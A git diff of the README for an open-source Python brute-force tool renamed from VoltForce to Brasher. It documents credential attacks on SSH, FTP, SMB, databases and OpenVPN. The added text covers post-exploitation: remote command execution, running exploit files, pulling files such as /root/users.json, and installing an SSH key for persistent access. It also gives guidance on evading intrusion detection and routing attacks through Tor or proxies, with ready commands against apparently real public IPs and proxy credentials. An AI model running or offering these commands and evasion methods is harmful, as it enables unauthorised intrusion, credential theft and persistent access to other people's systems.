@@ -1,193 +1,217 @@
-# VoltForce
-VoltForce (Versatile Offensive Login Tool) is an open-source Python tool for wordlist-based brute-force attacks. It is actively maintained by the developer and currently supports brute-forcing across ten different protocols. For more detailed information, please refer to the README.md file.
+# Brasher
+Brasher is a free dictionary-based brute-force attack tool written in Python. It can test 10 protocols and perform post-exploitation, including executing arbitrary code on a machine, running an arbitrary exploit from a file, and downloading and uploading files. Shell mode is also supported for some protocols. When testing SSH, after obtaining login credentials, you can also attempt to gain persistence in the system by specifying the --persist flag.
 
-<img width="1169" height="132" alt="изображение" src="https://github.com/user-attachments/assets/40a97f4f-1ac8-4713-89b5-332b22dee81e" />
-
-About the Tool
-
-VoltForce is a tool designed for brute-force attacks. Currently, it can test the security of services such as SSH, FTP, SMB, Telnet, MySQL, PostgreSQL, Redis, MongoDB, and POP3, as well as perform SSH testing via key brute-forcing.
+<img width="908" height="208" alt="изображение" src="https://github.com/user-attachments/assets/bccf26f7-7e24-4dec-adc0-643a2a7ee06d" />
 
 # Installation
 
 ```
-git clone https://github.com/vesel4akProjects/VoltForce.git
-cd VoltForce
+git clone https://github.com/Vesel4ak31/Brasher.git
+cd Brasher
 pip install -r requirements.txt --break-system-packages
 ```
-
-# Important note: The tool includes the `impacket` Python library. Windows Defender typically blocks its installation, as it flags it as malicious software. Be sure to disable your antivirus when installing on Windows.
 
 To view all 51 of the tool's parameters, run:
 
 ```
-python3 voltforce.py -h
+python3 brasher.py -h
 ```
 
 
-# Description of all parameters
+FLAG                       | DESCRIPTION
+---------------------------|---------------------------------------------------------------------------
+--host                     | Target host for the attack
+-P, --passwords-list       | File containing a list of passwords (one per line)
+-U, --usernames-list       | File containing a list of usernames (one per line)
+-t, --timeout              | Timeout between connection attempts (default: 0.1s)
+-u, --single-username      | Single username for the brute-force attack
+-p, --single-password      | Single password for the brute-force attack
+-G, --general-wordlist     | Wordlist file in `username:password` format (overrides -P and -U)
+-sr, --save-results        | Save successful credentials to a file
+-d, --delay                | Delay before starting the attack (seconds)
+-shuc, --shuffle-count     | Number of times to shuffle the password list (default: 10)
+--seed, --shuffle-seed     | Custom seed for shuffling (integer)
+-ssf, --shuffle-seeds-file | File containing seeds (one per line)
+-su, --shuffle-usernames   | Shuffle the usernames list before starting
+-sp, --shuffle-passwords   | Shuffle the passwords list before starting
+-sc, --shuffle-configs     | Shuffle OpenVPN config files before starting
+-sk, --shuffle-keys        | Shuffle SSH keys before starting
+-sh, --shuffle-hosts       | Shuffle the hosts list before starting
+-ss, --shuffle-seeds       | Shuffle the seeds list before starting
+-q, --quiet                | Disable all console output (only logs)
+-b, --banner               | Show the banner and exit
+-thr, --threads            | Number of threads to use (default: 5)
+-pb, --progress-bar        | Show a progress bar during brute-force
+-npb, --no-progress-bar    | Disable the progress bar
+-pt, --port                | Port for the connection (default: 22)
+-mr, --max-retries         | Maximum number of reconnection attempts
+-o, --output-file          | File to write logs to
+-nl, --no-log              | Disable logging
+-ko, --keep-open           | Keep the connection open after successful login
+-e, --exec, --execute      | Execute a command after successful authentication
+-rt, --random-timeout      | Random timeout range (e.g., 0.5-2.5)
+-ht, --host-timeout        | Timeout between testing different hosts
+-ie, --ignore-errors       | Ignore errors and continue execution
+-so, --success-only        | Show only successful attempts in output
+-mt, --max-time            | Maximum runtime before exiting
+-nc, --no-color            | Disable colored output
+-m, --mode                 | Protocol mode: ssh, ftp, smb, telnet, mysql, postgres, redis, mongodb, pop3, ssh-key, openvpn
+--log-mode                 | Log mode: w (overwrite) or a (append)
+-H, --hosts-list           | File containing a list of target hosts (one per line)
+--ssh-key                  | Path to a single SSH private key (for ssh-key mode)
+-kl, --keys-list           | File containing paths to SSH private keys
+-nb, --no-banner           | Skip displaying the banner
+-s5a, --socks5-address     | SOCKS5 proxy IP address
+-s5p, --socks5-port        | SOCKS5 proxy port
+-s5u, --socks5-username    | SOCKS5 proxy username (if required)
+-s5pass, --socks5-password | SOCKS5 proxy password (if required)
+-s, --stop-on-success      | Stop after finding one valid credential pair
+-time, --timer             | Display execution time at the end
+-ru, --reverse-usernames   | Reverse the usernames list order
+-rp, --reverse-passwords   | Reverse the passwords list order
+-rc, --reverse-configs     | Reverse the OpenVPN configs list order
+-rk, --reverse-keys        | Reverse the SSH keys list order
+-rh, --reverse-hosts       | Reverse the hosts list order
+-rs, --reverse-seeds       | Reverse the seeds list order
+--min-length-username      | Minimum length of username to test
+--max-length-username      | Maximum length of username to test
+--min-length-password      | Minimum length of password to test
+--max-length-password      | Maximum length of password to test
+-nd, --no-duplicates       | Remove duplicate entries from wordlists
+-db, --delay-between       | Delay (seconds) between attempts on the same host
+-vf, -ovcf, --open-vpn-config-file | OpenVPN configuration file
+-vu, -ovu, --open-vpn-username | Username for OpenVPN
+-vp, -ovp, --open-vpn-password | Password for OpenVPN
+-vc, -ovc, --open-vpn-connect | Connect via OpenVPN (flag)
+-cw, -ovcfw, --open-vpn-config-file-wordlist | File with OpenVPN config paths
+-uw, -ovuw, --open-vpn-usernames-wordlist | File with OpenVPN usernames
+-pw, -ovpw, --open-vpn-passwords-wordlist | File with OpenVPN passwords
+-ex, --exploit             | Execute commands from a specified exploit file
+-uft, --upload-file-to     | Remote path for file upload
+-dft, --download-file-to   | Local path for file download
+-uff, --upload-file-from   | Local path for file upload
+-dff, --download-file-from | Remote path for file download
+--shell                    | Open an interactive shell after authentication
+--persist                  | Install SSH key for persistent access (default: ~/.ssh/id_rsa.pub)
+-j, --jitter               | Add jitter (random deviation) to timeout
+-tp, --telnet-prompt       | Telnet prompt character (default: $)
+--smb-client-name          | SMB client name (default: SMBuser)
+--smb-server-name          | SMB server name (default: SMBServer)
+--smb-share-name           | SMB share name (default: share)
+--smb-remote-path          | Remote path for SMB (default: /)
+--smb-domain               | SMB domain (if required for NTLM auth)
 
 
-| Parameter name | What does the parameter do | Usage example |
-|----------------|----------------------------|----------------|
-| --host | A mandatory flag used to specify the target host for testing. | python3 voltforce.py --host "127.0.0.1" |
-| -P/--passwords-list | A list of passwords to be tried. The list should contain passwords in a column. If you only need to specify one password, create a list with only one password or use --single-password flag | python3 voltforce.py --host "127.0.0.1" -P "passwords.txt" |
-| -U/--usernames-list | List of usernames to check. The list must contain usernames in the column. If you only need to specify one username, create a list with only one username or use --single-username flag | python3 voltforce.py --host "127.0.0.1" -U "users.txt" |
-| -t/--timeout | Timeout between connection attempts in seconds. For real attacks, it's best to set it to at least 60 seconds. The initial value is 0.1 seconds | python3 voltforce.py --host "127.0.0.1" -t 0.5 |
-| -siu/--single-username | This flag is used to specify the username for brute-force attacks. Knowing the username will speed up the brute-force attack. | python3 voltforce.py --host "127.0.0.1" -siu "admin" |
-| -sip/--single-password | This flag is used to specify the password. If you know the password but not the username, you can speed up the brute-force attack. Can be combined with the --single-username flag. | python3 voltforce.py --host "127.0.0.1" -sip "password123" |
-| -G/--general-wordlist | This flag is used to specify wordlists that store values line by line in the 'username:password' format. After specifying this flag, you don't need to specify the -P or -U flags. | python3 voltforce.py --host "127.0.0.1" -G "creds.txt" |
-| -sr/--save-results | This flag is used to save successful connection attempts to a target file. | python3 voltforce.py --host "127.0.0.1" -sr "results.txt" |
-| -d/--delay | Delay before starting work in seconds | python3 voltforce.py --host "127.0.0.1" -d 5 |
-| -shu/--shuffle | Shuffle wordlists before starting | python3 voltforce.py --host "127.0.0.1" -shu |
-| -shuc/--shuffle-count | This flag controls how many times to mix the password. By default, VoltForce mixes passwords 10 times. | python3 voltforce.py --host "127.0.0.1" -shu -shuc 5 |
-| --seed/--shuffle-seed | A flag is used to specify a custom seed for shuffling. Specify an integer, and shuffling will work the same way. | python3 voltforce.py --host "127.0.0.1" -shu --seed 42 |
-| -ssf / --shuffle-seeds-file | This flag is needed to specify a file in which the natural numbers used as seeds for shuffling the dictionary will be written line by line. | python3 voltforce.py --host 127.0.0.1 --shuffle-seed seeds.txt |
-| -q/--quiet | Disables all console output. VoltForce won't notify you of any messages, but this mode enables logging, and all data will be written there. | python3 voltforce.py --host "127.0.0.1" -q |
-| -b/--banner | Show banner and exit | python3 voltforce.py -b |
-| -thr/--threads | The number of threads to be checked. The higher the number of threads, the more noise and activity will be in the logs. The initial value is 5 threads. | python3 voltforce.py --host "127.0.0.1" -thr 10 |
-| -pb/--progress-bar | Progress bar to show the process of searching and counting the number of combinations. | python3 voltforce.py --host "127.0.0.1" -pb |
-| -npb/--no-progress-bar | Forces the progress bar to be disabled if someone changes the tool's values or decides not to include it. | python3 voltforce.py --host "127.0.0.1" -npb |
-| -p/--port | Specifies the port for further connections. Brute-force functions use default ports for connections; for example, SSH uses port 22. | python3 voltforce.py --host "127.0.0.1" -p 2222 |
-| -mr/--max-retries | This setting controls the maximum number of connection attempts to the host. Once the maximum number of connection attempts is reached, VoltForce will shut down. | python3 voltforce.py --host "127.0.0.1" -mr 100 |
-| -o/--output-file | This parameter is responsible for logging all program actions. | python3 voltforce.py --host "127.0.0.1" -o "log.txt" |
-| -nl/--no-log | Forces logging to be disabled if someone changes the tool's values or decides not to enable logging. | python3 voltforce.py --host "127.0.0.1" -nl |
-| -ko/--keep-open | This flag ensures that we don't close the connection after the first login credentials are detected. Specifying this flag will save you connection time. | python3 voltforce.py --host "127.0.0.1" -ko |
-| -e/--exec/--execute | This flag is used to execute arbitrary commands after gaining privileges. Specify a command that VoltForce will execute immediately after receiving the required data. | python3 voltforce.py --host "127.0.0.1" -e "whoami" |
-| -rt/--random-timeout | This flag is used to specify a range of values that will be selected using cryptographically strong randomness based on the entropy of your OS and used as a random timeout. | python3 voltforce.py --host "127.0.0.1" -rt 0.5-2.0 |
-| -ht/--host-timeout | This flag controls the timeout between host tests. If you're testing more than one host, after testing one host, there will be a delay of the specified number of seconds before testing the next host. | python3 voltforce.py --host "127.0.0.1" -ht 10 |
-| -ie/--ignore-errors | This flag is used to ignore errors. If this flag is enabled, VoltForce will stop displaying any error or warning messages and continue running. | python3 voltforce.py --host "127.0.0.1" -ie |
-| -so/--success-only | This flag is used to output only successful data search attempts to the console. If you specify this flag, the program may appear to hang. However, the brute-force process will still continue. | python3 voltforce.py --host "127.0.0.1" -so |
-| -mt/--max-time | Maximum operating time | python3 voltforce.py --host "127.0.0.1" -mt 300 |
-| -nc/--no-color | Color output will be disabled | python3 voltforce.py --host "127.0.0.1" -nc |
-| -m/--mode | The tool's operating mode. By default, the search mode is SSH. Available modes: ssh, ftp, smb, telnet, mysql, postgres, redis, mongodb, pop3, ssh-key | python3 voltforce.py --host "127.0.0.1" -m ftp |
-| --log-mode | Log mode: w = overwrite, a = append (default: a) | python3 voltforce.py --host "127.0.0.1" --log-mode w |
-| -H/--hosts-list | List of hosts in the file. To specify targets. Hosts should be specified in a column. | python3 voltforce.py -H "hosts.txt" |
-| -sk/--ssh-key | This flag is used to specify the SSH authorization key. You only need to specify the path to the key file. You must also select the ssh-key mode using the --mode flag. | python3 voltforce.py --host "127.0.0.1" -m ssh-key -sk "id_rsa" |
-| -kl/--keys-list | This flag is used to specify a file containing a list of paths to keys for SSH authentication. The flag should contain a wordlist containing file paths in a column. | python3 voltforce.py --host "127.0.0.1" -m ssh-key -kl "keys.txt" |
-| -nb/--no-banner | Don't show the banner | python3 voltforce.py --host "127.0.0.1" -nb |
-| -sa/--socks5-address | A flag for specifying a SOCKS5 proxy address that hides the real IP address. If you want to use the TOR network as a SOCKS5 proxy, first start the TOR service itself and then specify the address 127.0.0.1. | python3 voltforce.py --host "127.0.0.1" -sa "127.0.0.1" |
-| -sp/--socks5-port | Parameter for specifying the SOCKS5 proxy port. If you want to use the Tor network as a proxy, first start the Tor service and then specify port 9050. | python3 voltforce.py --host "127.0.0.1" -sa "127.0.0.1" -sp 9050 |
-| -su/--socks5-username | Flag for specifying the username for the SOCKS5 proxy. If your SOCKS5 proxy doesn't require a username, do not specify this parameter. | python3 voltforce.py --host "127.0.0.1" -sa "127.0.0.1" -su "user" |
-| -spas/--socks5-password | Flag for specifying a password for the SOCKS5 proxy. If your SOCKS5 proxy does not require a password, do not specify this parameter. | python3 voltforce.py --host "127.0.0.1" -sa "127.0.0.1" -spas "pass" |
-| -s/--stop-on-success | Stops the program after finding at least one login and password | python3 voltforce.py --host "127.0.0.1" -s |
-| -time/--timer | Show execution time at the end | python3 voltforce.py --host "127.0.0.1" -time |
-| -ru/--reverse-usernames | Reverse the usernames wordlist order | python3 voltforce.py --host "127.0.0.1" -ru |
-| -rp/--reverse-passwords | Reverse the passwords wordlist order | python3 voltforce.py --host "127.0.0.1" -rp |
-| --min-length-username | Minimum username length to try | python3 voltforce.py --host "127.0.0.1" --min-length-username 4 |
-| --max-length-username | Maximum username length to try | python3 voltforce.py --host "127.0.0.1" --max-length-username 16 |
-| --min-length-password | Minimum password length to try | python3 voltforce.py --host "127.0.0.1" --min-length-password 6 |
-| --max-length-password | Maximum password length to try | python3 voltforce.py --host "127.0.0.1" --max-length-password 20 |
-| -nd/--no-duplicates | Remove duplicate entries from wordlists | python3 voltforce.py --host "127.0.0.1" -nd |
-| -db/--delay-between | Delay between attempts on the same host (seconds) | python3 voltforce.py --host "127.0.0.1" -db 0.5 |
-| -vf/-ovcf/--open-vpn-config-file | This flag is used to specify the configuration file for connecting via OpenVPN. You can use it to bruteforce OpenVPN or to connect to the VPN itself. Specify the path to the configuration file. If you don't want to bruteforce OpenVPN but want to connect to it, be sure to include the --open-vpn-connect flag. | python3 voltforce.py --host "127.0.0.1" -vf "client.ovpn" |
-| -vu/-ovu/--open-vpn-username | This flag is used to specify the username when connecting to OpenVPN or brute-forcing it. You can use it for both brute-forcing and connecting to the VPN itself. Specify the username. If you don't want to brute-force OpenVPN but want to connect to it, be sure to use the --open-vpn-connect flag. | python3 voltforce.py --host "127.0.0.1" -vu "admin" |
-| -vp/-ovp/--open-vpn-password | This flag is used to specify a password when connecting to OpenVPN or brute-forcing it. You can use it both for brute-forcing and for the connection itself. Specify the password for access. If you don't want to brute-force OpenVPN but plan to connect to it, be sure to use the --open-vpn-connect flag. | python3 voltforce.py --host "127.0.0.1" -vp "password123" |
-| -vc/-ovc/--open-vpn-connect | This flag is required to confirm the OpenVPN connection. If you've entered all the required login information, VoltForce will attempt to register to establish a connection. This flag only serves as confirmation that you want to connect via OpenVPN. | python3 voltforce.py --host "127.0.0.1" -vf "client.ovpn" -vu "admin" -vp "password123" -vc |
-| -cw/-ovcfw/--open-vpn-config-file-wordlist | This flag specifies the path to a file containing, in columns, target configuration files for testing private network login credentials. If you want to use only one configuration file, use the --open-vpn-config-file flag. | python3 voltforce.py --host "127.0.0.1" -cw "configs.txt" |
-| -uw/-ovuw/--open-vpn-usernames-wordlist | This flag specifies the path to a file containing usernames in a column for testing private network login credentials. If you want to use only one username, use the --open-vpn-username flag. The username value is equivalent to the --usernames-wordlist flag. You can also specify this flag if you prefer. | python3 voltforce.py --host "127.0.0.1" -uw "users.txt" |
-| -pw/-ovpw/--open-vpn-passwords-wordlist | This flag specifies the path to a file containing a column of passwords for testing private network login credentials. If you want to use only one password, use the --open-vpn-password flag. The value of this password is equivalent to the --passwords-wordlist flag. You can also specify this flag if you prefer. | python3 voltforce.py --host "127.0.0.1" -pw "passwords.txt" |
+<img width="2280" height="1143" alt="изображение" src="https://github.com/user-attachments/assets/7631722c-a667-470a-91b8-cfe665f71a7c" />
 
-<img width="1316" height="480" alt="изображение" src="https://github.com/user-attachments/assets/8d5bbb05-7569-4a78-aa40-c65d863923f9" />
 
 # Use case
 
-This tool can be safely used in brute-force attacks against wordlists. Below is an example of a typical usage command:
+This tool can be safely used for brute-force attacks against wordlists. Below is an example of a typical command:
 
 ```
-python3 voltforce.py --host "110.124.65.231" -P "/usr/share/dirb/wordlists/common.txt" -siu "root" --timeout 0 --mode "ftp" --port 21 -o report.txt -sr "result.txt" -d 5 -shu -thr 200 -ie --timer
+python3 brasher.py -u "root" -p 'EhGe1hK5400qjFgYqtRcdcNOg3efdmyOHT' --host 85.204.18.112 --mode "ssh" --port 22 --timeout 0.4 -e "cat .ssh"
 ```
 
-<img width="1300" height="177" alt="изображение" src="https://github.com/user-attachments/assets/dae3c635-4ece-4279-aacb-adf78c83d649" />
+<img width="806" height="289" alt="изображение" src="https://github.com/user-attachments/assets/7c5ce386-efc1-4e60-8d9d-ef12a4523ed0" />
+
+This example demonstrates a typical usage scenario. Brasher's entire output is fairly minimal. Important note: the more threads, the greater the load on your system. If you use too many threads during real attacks, the intrusion detection system (IDS) will quickly block you.
+For smooth operation, be sure to use the --random-timeout flag to specify the random timeout radius during testing, the --delay-between flag to set delays between tests, and the very interesting --shuffle-* flags, which will shuffle your wordlists as many times as necessary. You can fine-tune which wordlists to shuffle and which not: for example, if you only want to shuffle a list of passwords, use the --shuffle-passwords flag. The number of shuffles can be specified using the --shuffle-count flag.
+A similar scheme works with the --reverse-* flags. You can reverse any wordlist you need. For example, if you want to reverse only a list of usernames, specify the --reverse-usernames flag. You can also remove duplicates from wordlists by specifying the --no-duplicates flag.
+In addition to the convenient shuffling and reversal system, you can filter the maximum and minimum character lengths of usernames or passwords. For example, by specifying the --min-length-username 1 and --max-length-username 10 flags, Brasher will remove all usernames longer than 10 characters.
+
+<img width="718" height="362" alt="изображение" src="https://github.com/user-attachments/assets/17b008b7-bd6f-4c11-8a01-7cae84cee00b" />
 
 
-
-This example demonstrates a typical usage scenario. All output from VoltForce is quite minimalistic. Important note: the more threads, the greater the load on your system. If you have too many threads, you will quickly be blocked by the IDS in real attacks. For seamless use, be sure to use the --random-timeout flag to specify the random timeout radius during testing, the --delay-between flag to specify delays between tests, and the very interesting --shuffle flag, which will shuffle your wordlists as many times as desired. The number of shuffles can be specified using the --shuffle-count flag.
-
-<img width="545" height="89" alt="изображение" src="https://github.com/user-attachments/assets/4db8f645-6b64-4885-95a2-acb13216f0d6" />
-
-You can also use a SOCKS5 proxy. This is done using the --socks5-address,--socks5-port,--socks5-username and --socks5-password flags. You can launch the Tor service and carry out the attack through it by simply specifying the address and port. If you wish to use a private proxy, you can also provide a username and password.
-
-To reduce your chances of getting banned by IDS, I recommend using the --random-timeout, --host-timeout, --delay-between, and --max-time flags. Using the first flag, you can specify a range of values ​​to use as the timeout. --host-timeout controls the timeout when testing multiple hosts. You can also specify multiple hosts for testing using the --hosts-list flag. --delay-between will add delays before testing, and the --max-time flag allows you to specify a specific runtime for the program. Here's an example command with all these flags:
+You can also use a SOCKS5 proxy. This is done with the --socks5-address, --socks5-port, --socks5-username, and --socks5-password flags. You can start the Tor service and attack through it simply by specifying the address and port. If you want to use a private proxy, you can also specify the username and password.
+To reduce the likelihood of being blocked by IDS, I recommend using the --random-timeout, --host-timeout, --delay-between, --jitter, and --max-time flags. The first flag allows you to specify a range of timeout values. --host-timeout controls the timeout when testing multiple hosts. You can also specify a list of hosts to test using the --hosts-list flag. --delay-between adds delays before testing, --jitter adds an additional delay to the current delay, and --max-time allows you to specify a specific execution time. Here is an example command with all these flags. In addition to the above, it is recommended to specify the --shuffle-* and --reverse-* flags, as they eliminate patterns that might otherwise be revealed by viewing logs:
 
 ```
-python3 voltforce.py --hosts-list "hosts.txt" -P "passwords.txt" -U "users.txt" --random-timeout "1-30" --host-timeout 300 --delay-between 4 --max-time 300
+python3 brasher.py --hosts-list "hosts.txt" -P "passwords.txt" -U "users.txt" --random-timeout "1-30" --host-timeout 300 --delay-between 4 --max-time 300 --shuffle-usernames --shuffle-passwords --reverse-usernames --reverse-passwords --jitter -0.5 --socks5-address "88.204.41.118" --socks5-port 61837 --socks5-username "SM2GT7Je" --socks5-password "rZjc6DYh"
 ```
+<img width="641" height="77" alt="изображение" src="https://github.com/user-attachments/assets/c0f15e4b-7bda-49b8-b39c-bdc41198b8f4" />
 
-
-You can specify only one username or one password when testing using the --single-username and --single-password flags, respectively. You can also specify the --stop-on-success flag to terminate the test after the credentials are found.
-
-I'd like to mention a few more important flags. I think the most interesting are the --reverse-usernames and --reverse-passwords flags. They allow you to reverse wordlists for usernames and passwords, respectively. This flag is very useful when you've already checked part of a wordlist and need to check the last passwords in the list.
-The --no-duplicates flag is equally useful. It removes duplicates from both wordlists. This is a very useful flag; it allows you to bypass checking wordlists for duplicates.
-The --general-wordlist flag is also very useful. Instead of two wordlists, you can specify a single wordlist where usernames and passwords should be written in a columnar format, "username:password." This way, you don't have to waste time specifying two wordlists.
-Another cool and useful flag is --ignore-errors. It will ignore all program errors and continue working.
-As for the last useful flags, I can't help but mention the --min-length-username, --max-length-username, --min-length-password, and --max-length-password flags. These can filter your wordlist by the minimum and maximum lengths of usernames and passwords, respectively. Sorting can take time, O(n) to be exact, but it's worth it. This flag is incredibly useful.
+When using the -u and -p flags, you can specify only one username or password for testing. You can also use the --stop-on-success flag to terminate the test once the credentials are detected.
+I'd like to mention a few more important flags.
+The --general-wordlist flag is also very useful. Instead of two wordlists, you can specify a single list in which usernames and passwords are written in the format "username:password." This way, you don't have to waste time specifying two separate lists.
+Another useful flag is --ignore-errors. It allows you to ignore program errors and continue running. If you specify the --quiet flag, nothing will be output to the console except for log entries. There are other flags, such as --banner and --no-banner, which display a banner and terminate the program, or hide it and continue running. There's also the --delay flag, which adds a delay before starting the program.
 
 # Brute-Forcing with SSH Keys
 
-VoltForce supports brute-force mode with SSH keys. To do this, you'll need to specify the --ssh-key flag. It's essentially the same as the --single-password flag. You only need to specify the path to the key file. Paramiko will detect the key type automatically. After specifying the wordlist with usernames and the target key, the brute-force process will begin. You can also specify the --keys-list flag. This is the same as --passwords-list. You should specify the paths to the target keys in the column. I decided to break this mode into a separate paragraph because it's essentially a hack. In the main code, it's actually substituted into the password field. It can confuse the user when analyzing the code, so I decided to write about it. You can easily use --passwords-list instead of --keys-list , and nothing will change, but I don't see the point unless you're really lazy.
+Brasher supports brute-force mode using SSH keys. To do this, specify the --ssh-key flag. This is essentially the same as the --single-password flag: you just need to specify the path to the key file, and Paramiko will automatically detect its type. After specifying a list of usernames and the target key, the brute-force process begins.
+You can also use the --keys-list flag, which is similar to --passwords-list. In this case, specify the paths to the target keys in the corresponding column. I decided to separate this mode into a separate paragraph because it's essentially a hack: in the main code, the key is actually substituted into the password field. This can be confusing when analyzing the code, so I thought it worth mentioning. You can use --passwords-list instead of --keys-list, and the result will be the same, but I don't see the point unless you're really lazy.
 
 # Connecting and Bruteforcing OpenVPN
 
-<img width="2013" height="682" alt="изображение" src="https://github.com/user-attachments/assets/d88b3080-b77e-4b46-82e5-907af97777a1" />
-
-Yes, this feature has been available since version 1.1. Now you can connect to OpenVPN to hide your IP address using your login and password, as well as a configuration file, or you can bruteforce this protocol using the same data. To indicate that you want to connect to your VPN, be sure to include the --open-vpn-connect flag.
-
-<img width="2110" height="422" alt="изображение" src="https://github.com/user-attachments/assets/7e26ea21-dbae-4907-a7b4-caeb76acb87b" />
+Yes, this feature has been available since the latest update. You can now connect to OpenVPN to hide your IP address using a username and password, as well as a configuration file. To specify that you want to connect to the VPN, be sure to include the --open-vpn-connect flag. To specify a single configuration file, use the --open-vpn-config-file flag, and to specify a list of configuration files, use the --open-vpn-config-file-wordlist flag. Important: The two flags above are separate parameters and are not substituted for --passwords-list.
+To specify the OpenVPN username and a list of usernames, use the --open-vpn-username and --open-vpn-usernames-wordlist flags, respectively. The same applies to passwords: to specify the OpenVPN user password and a list of passwords, use the --open-vpn-password and --open-vpn-passwords-wordlist flags, respectively. These four flags are substituted for --usernames-list and --passwords-list. If your configuration file already contains the username and password, specifying them as separate flags is not necessary.
 
 
-# Connections and Arbitrary Code Execution
 
-Yes, VoltForce can do that too. This mode is currently in testing, but you can already execute arbitrary code for SSH, Telnet, Redis, MySQL, and PostgreSQL after receiving login credentials. VoltForce activates interactive mode, and it will print the command output. This flag is super useful, but still rather crude. This is where the --keep-open flag comes in. It allows you to keep the connection open after receiving the data. This flag is useful when you need to immediately begin executing commands.
+# Post-exploitation
 
-# Parameters that can be used
+Yes, Brasher can do that too. After receiving login credentials, you can specify multiple files for post-exploitation. You can simply specify --exec, and Brasher will send you the command output upon receipt, or you can specify --exploit, and simply select your file with commands to execute. You can also upload and download files to the target server. These features are only available for SSH, FTP, and SMB. You can download or upload any file. You can also enable shell mode. This feature is only available for SSH, FTP, and Telnet. This mode is essentially just an environment for processing your commands. Important: if you enter non-existent commands, shell mode may hang.
+Another cool feature is the --persist flag. This flag is only supported over SSH. When specified, Brasher will attempt to add your key to the SSH key authentication list and allow you to connect using your key. This mode has not yet been fully tested. In fact, Brasher offers excellent post-exploitation capabilities: you can perform RCE-like attacks and do anything you want. Here's an example of running Brasher with post-exploitation enabled:
 
-Here I'll mention some flags. Similar ones include: --banner, --no-banner, --delay, --quiet, --timer, and --shuffle-seed.
---banner only displays the logo and exits. Honestly, I don't even know where such a flag would be useful.
---no-banner, on the other hand, will simply not display the banner.
---delay will delay before running the specified number of seconds.
---quiet will not output anything at all. You might think the program is working incorrectly, but that's a lie. Logs will be written, and all attempts will be saved to the log file. If logging isn't enabled, this flag will enable it automatically.
---timer will start a timer for the entire run and display the total run time at the end of the program. This flag is simply useful.
---shuffle-seed allows you to specify a custom seed for shuffling the wordlist. You need to specify any positive integer. The seed allows you to specify a custom sort order. Use this flag with caution, as a poor seed will make the shuffling non-random.
+```
+python3 brasher.py -u "root" -p 'EhGe1hK5400qjFgFLM9SbTyJu8Yr' --host 85.204.18.112 --mode "ssh" --port 22 --timeout 0.4 --exploit "exploit.py" --upload-file-to "/root/" --upload-file-from "./exploit.py" --download-file-to "/home/result.txt" --download-file-from "./root/users.json" --shell --persist
+```
+<img width="729" height="96" alt="изображение" src="https://github.com/user-attachments/assets/c3c07c3f-7689-4d2f-b5db-39ed64901b7e" />
+
+# Useful Options
+
+I'll mention a few flags here. Similar ones include: --keep-open, --timer, and --shuffle-seed.
+--keep-open will maintain the connection until you manually close it. Nothing happens while the connection is held.
+--timer will start a timer for the entire execution period and display the total time at the end of the program. This flag is useful for benchmarking.
+--shuffle-seed allows you to specify a custom seed for shuffling the word list. It must be any positive integer. The seed parameter specifies the sorting order. Use this flag with caution, as an incorrect value can make the shuffle non-random. If you need to use multiple seed values, specify the --shuffle-seeds-file flag. You can also shuffle and reverse the same file by specifying the --shuffle-seeds and --reverse-seeds flags, respectively. Useless, but interesting.
+Here's an example command to run with these flags:
+
+<img width="601" height="106" alt="изображение" src="https://github.com/user-attachments/assets/76fa4e14-b4c3-446f-a22c-4f424d22389f" />
+
+
+```
+python3 brasher.py -u "root" -p 'EhGe1TyJu8Yr' --host 85.204.18.112 --mode "ssh" --port 22 --timeout 0.4 --timer --shuffle-seeds --seed 30 --reverse-seeds --keep-open
+```
+<img width="535" height="61" alt="изображение" src="https://github.com/user-attachments/assets/8172b70c-72d2-4401-8979-d51a3cfd1016" />
 
 # About logging, threads, and the progress bar
 
-Let's start with logging. You can specify it using the -o parameter. If you don't specify a logging filename, VoltForce will create one named after the current date. The logging will record everything in detail. The time in the logging will be the most accurate date possible, including five decimal places for seconds. The message type will also be displayed. For example, if a parameter is being tested, the word "TESTING" will be displayed. Next, the service being tested and the logging message itself will be listed. This approach will ensure the most accurate logging for future security audits. You can disable logging using the --no-log flag.
-Now about threads. You can specify them using the -thr flag. By default, VoltForce uses 10 threads. Threads increase the speed by a factor of N, meaning that opening two threads will cut the search time in half. The more threads you have, the more connections you'll have, which means a higher chance of being blocked by IDS. Therefore, avoid using too many threads, especially if you have a slower PC.
-You can also specify the --progress-bar flag, which will display a progress bar showing your progress.Since the tqdm library is not thread-friendly, VoltForce will automatically disable it if the number of threads exceeds 15. Disabling this feature will cause tqdm to become extremely slow. You can also forcefully disable the progress bar using the --no-progress-bar flag. Therefore, if you want to perform an effective scan with a large number of threads and don't want to be banned by the IDS, use flags that reduce the chance of being banned. I've already listed them.
+Let's start with logging. You can configure it using the -o parameter. If you don't specify a log file name, Brasher will create a file named after the current date. The logs will record detailed information. The time will be recorded as accurately as possible, including five decimal places for seconds. The message type will also be displayed: for example, when testing a parameter, the word "TESTING" will appear. Next, the service being tested and the message itself are specified. This approach ensures the accuracy necessary for subsequent security checks. You can disable logging with the --no-log flag.
+Now about threads. You can specify their number using the -thr flag. By default, Brasher uses 10 threads. Threads increase performance: for example, using two threads will cut the scan time in half. However, more threads means more connections, which means a higher risk of being blocked by an intrusion detection system (IDS). Therefore, avoid using too many threads, especially on slow computers. It's also important to note that the Python GIL won't allow you to create, say, 1,000,000 threads.
+You can use the --progress-bar flag to display a progress bar. Since the tqdm library doesn't support multithreading, Brasher automatically disables it if the number of threads exceeds 15. Disabling this feature significantly slows down tqdm. You can also forcefully disable the progress bar using the --no-progress-bar flag. If you want to perform an effective scan with a large number of threads and avoid IDS blocking, use the flags I mentioned earlier that reduce the detection probability.Here's an example command to run with these flags:
+
+```
+python3 brasher.py -u "root" -p 'EhGe18Yr' --host 85.204.18.112 --mode "ssh" --port 22 --timeout 0.4 --timer --shuffle-seeds --seed 30 --reverse-seeds --keep-open -pb -thr 100
+```
+
+<img width="1196" height="319" alt="изображение" src="https://github.com/user-attachments/assets/c577bd80-0779-4768-b1e0-ca8afa41d1cd" />
+
 
 # Disclaimer
 
-The author assumes no liability for the unauthorized use of this tool to obtain credentials. This tool is intended and used exclusively for legitimate security testing and testing of services on servers. Do not use it for malicious purposes!
+The author is not responsible for any unauthorized use of this tool to obtain credentials. This tool is intended and should be used exclusively for legitimate security testing and service verification on servers. Do not use it for malicious purposes!
 
 # License
 
-This tool is distributed under the MIT license. So to prevent you from opening the LICENSE file, I will write its contents here:
+This tool is distributed under the MIT License. For your convenience, I've included the license here:
 
 ```
-
 MIT License
 
 Copyright (c) 2026 Vesel4ak
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
